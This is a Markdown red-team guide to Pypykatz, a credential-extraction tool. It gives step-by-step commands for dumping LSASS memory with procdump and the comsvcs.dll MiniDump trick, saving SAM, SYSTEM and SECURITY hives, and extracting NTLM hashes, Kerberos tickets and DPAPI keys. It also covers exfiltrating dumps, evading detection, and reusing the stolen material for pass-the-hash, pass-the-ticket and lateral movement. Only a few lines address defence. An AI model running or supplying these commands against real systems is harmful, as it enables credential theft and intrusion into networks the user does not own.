
# Pypykatz – Complete Pentester & Red Team Guide

---

## 1. Overview

**Pypykatz** is a Python reimplementation of Mimikatz.  
It can parse memory dumps of the **LSASS** process to extract credentials, Kerberos tickets, NTLM hashes, and other authentication material.

Advantages over traditional Mimikatz:
- Pure Python (cross-platform parsing, offline analysis)
- No need to execute on the victim to parse (offline mode)
- Easier integration into custom tooling
- Can be less detectable when used offline

---

## 2. Installation

```bash
# Install via pip
pip install pypykatz

# Install from source (latest features)
git clone https://github.com/skelsec/pypykatz.git
cd pypykatz
pip install .
```


---

## 3. Usage Modes

### 3.1 Local live parsing
Requires admin rights and direct access to LSASS.

```bash
pypykatz live lsa
```

### 3.2 Offline parsing of LSASS dumps
Safest and most common during red team ops.

```bash
pypykatz lsa minidump lsass.dmp
```

### 3.3 Remote parsing over SMB
Dump remotely and parse locally (combine with Impacket/SMB client).

---

## 4. Output Formats

- **Human-readable table** (default)
- **JSON** for automation
- **CSV** for bulk processing

```bash
pypykatz lsa minidump lsass.dmp --json > creds.json
```

---

## 5. Credential Types Extracted

- NTLM hashes
- Kerberos tickets
- WDigest plaintext passwords
- SSP credentials
- DCC cached domain credentials
- Cloud/SSO creds (if stored in LSASS)

---

## 6. Offensive Workflow

1. **Obtain LSASS dump**:
   - Local:  
     ```bash
     procdump64.exe -ma lsass.exe lsass.dmp
     ```
   - Remote (Impacket smbclient):
     ```bash
     smbclient.py user@target
     ```
   - In-memory: use `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> dump.dmp full`
2. **Exfiltrate dump** safely to your machine.
3. **Parse with Pypykatz**:
   ```bash
   pypykatz lsa minidump lsass.dmp
   ```
4. **Use creds** for lateral movement (`psexec`, `wmiexec`, `RDP`, Kerberos pass-the-ticket).

---

## 7. Red Team Scenarios

- **Pass-the-Hash (PTH)**: Extract NTLM → use with SMB/WinRM.
- **Pass-the-Ticket (PTT)**: Extract `.kirbi` Kerberos tickets → inject into session.
- **Kerberos persistence**: Keep tickets for offline reuse.
- **Credential relay chains**: Pair with `ntlmrelayx.py`.

---

## 8. Python Library Usage

Pypykatz can be imported directly into your scripts for automation:

```python
from pypykatz.pypykatz import pypykatz

# Parse offline dump
creds = pypykatz.parse_minidump('lsass.dmp')

for luid in creds.logon_sessions:
    session = creds.logon_sessions[luid]
    for cred in session.credentials:
        print(f"Username: {cred.username}, Password: {cred.password}")
```

---

## 9. Detection Evasion

- **Offline parsing**: Never run Pypykatz on target.
- **Custom dump method**: Rename tools and use LOLBins like `comsvcs.dll`.
- **Time-shifted exfiltration**: Dump now, parse later when safe.
- **Partial dumps**: Target only relevant memory regions.

---

## 10. Defensive Considerations

- LSASS protection (RunAsPPL)
- Credential Guard
- EDR memory dump blocking
- Audit logon sessions for suspicious access

---

## 11. Integration with Other Tools

- **Impacket** – remote dumping via SMB & parsing locally
- **CrackMapExec** – automation of dump & parse
- **Cobalt Strike** – dump LSASS in Beacon → parse with Pypykatz
- **BloodHound** – feed credentials for graph expansion

---

## 12. Advanced Features

- Parse **Kerberos cache** only:
```bash
pypykatz kerberos minidump lsass.dmp
```
- Output `.kirbi` ticket files:
```bash
pypykatz lsa minidump lsass.dmp --kerberos-dir tickets/
```
- Handle **multiple dumps** in one command:
```bash
pypykatz lsa minidump dump1.dmp dump2.dmp
```
- Combine with **Python threading** for bulk parsing of dumps from multiple hosts.

---

## 13. Troubleshooting

| Problem | Cause | Solution |
|---------|-------|----------|
| No credentials found | Dump incomplete | Ensure full memory dump |
| Access denied | No admin rights | Use privilege escalation first |
| Garbled output | Wrong dump architecture | Match 32-bit vs 64-bit parser |

---

## 14. References

- **GitHub**: https://github.com/skelsec/pypykatz  
- **Mimikatz**: https://github.com/gentilkiwi/mimikatz  
- **Dumping LSASS Techniques**: https://attack.mitre.org/techniques/T1003/  
- **Kerberos Pass-the-Ticket**: https://adsecurity.org/

---

## 15. Registry Hive Parsing (Offline Credential Recovery)

Pypykatz can parse **SAM**, **SYSTEM**, and **SECURITY** registry hives to recover:
- Local account password hashes
- LSA secrets (service account creds, cached domain creds)
- DPAPI system keys

**Usage:**
```bash
# Parse SAM & SYSTEM hives
pypykatz registry sam SYSTEM SAM

# Parse SECURITY hive for LSA secrets
pypykatz registry lsa SYSTEM SECURITY
```

**Workflow Example:**
1. Obtain registry hives:
   ```bash
   reg save HKLM\SYSTEM SYSTEM
   reg save HKLM\SAM SAM
   reg save HKLM\SECURITY SECURITY
   ```
2. Exfiltrate the files.
3. Parse with Pypykatz to extract hashes and secrets.
4. Crack offline or use in pass-the-hash.

---

## 16. DPAPI Master Key Extraction & Decryption

DPAPI (Data Protection API) protects stored credentials in Windows.

Pypykatz can:
- Extract DPAPI master keys from LSASS or registry.
- Decrypt DPAPI-protected data offline.

**Example:**
```bash
# Extract DPAPI master keys from LSASS dump
pypykatz dpapi minidump lsass.dmp

# Use keys to decrypt Chrome saved passwords, Wi-Fi creds, etc.
```

**Workflow:**
1. Dump LSASS or obtain registry hives.
2. Extract DPAPI master keys.
3. Apply keys to encrypted blobs (from browsers, Outlook, RDP creds).

---

## 17. Kerberos Ticket Injection

While Pypykatz itself focuses on extraction, the `.kirbi` files it exports can be injected into a session for **Pass-the-Ticket (PTT)** attacks.

**Example using Rubeus:**
```bash
Rubeus.exe ptt /ticket:ticket.kirbi
```

**Example using Mimikatz:**
```bash
mimikatz # kerberos::ptt ticket.kirbi
```

**Example using Python (krb5 libraries):**
```python
# Inject ticket into current session with python-gssapi or python-krbV
```

---

## 18. Live Remote Execution Integration

Pypykatz has no built-in remote LSASS dumping, but you can integrate it with:
- **Impacket’s smbexec/wmiexec** to trigger remote dumps.
- **PsExec/WinRM** to run a Python script that calls `pypykatz.live.lsa()` remotely.

Example:
```python
from pypykatz.pypykatz import pypykatz
creds = pypykatz.live.lsa()
```

Pair with a remote execution method to get live credentials from a target without writing a dump to disk.

---

